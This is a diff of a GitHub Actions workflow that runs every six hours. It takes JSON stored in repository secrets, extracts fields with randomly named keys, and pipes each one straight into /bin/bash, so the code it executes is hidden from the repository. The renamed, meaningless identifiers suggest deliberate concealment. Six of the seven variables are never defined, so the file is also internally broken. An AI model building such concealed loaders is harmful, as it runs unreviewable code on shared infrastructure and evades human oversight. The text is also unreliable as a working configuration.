@@ -1,21 +1,23 @@
 name: tongmengshi2006
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
-jobs:  # 20620
+    - cron: '31 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tongmengshi2006
         env:
-          wv74: ${{ secrets.wv74 }}
+          kjg9341: ${{ secrets.kjg9341 }}
         run: |
-          echo $wv74 | jq -r .njcoq839 | /bin/bash
-          echo $oe2878 | jq -r .nai25 | /bin/bash
-          echo $t7628 | jq -r .v627 | /bin/bash
-          echo $k8544 | jq -r .pcn1 | /bin/bash
-          echo $hi35814 | jq -r .x16 | /bin/bash
-          echo $fu012 | jq -r .aj866 | /bin/bash
+          echo $kjg9341 | jq -r .mrhbw370 | /bin/bash
+          echo $n947 | jq -r .fopp32 | /bin/bash
+          echo $lpswl66016 | jq -r .gpoy98 | /bin/bash
+          echo $gpfxi0974 | jq -r .y630 | /bin/bash
+          echo $gwztt91809 | jq -r .pzrd393 | /bin/bash
+          echo $vyc459 | jq -r .mdg9 | /bin/bash
+          echo $shdy66 | jq -r .cm6981 | /bin/bash
 
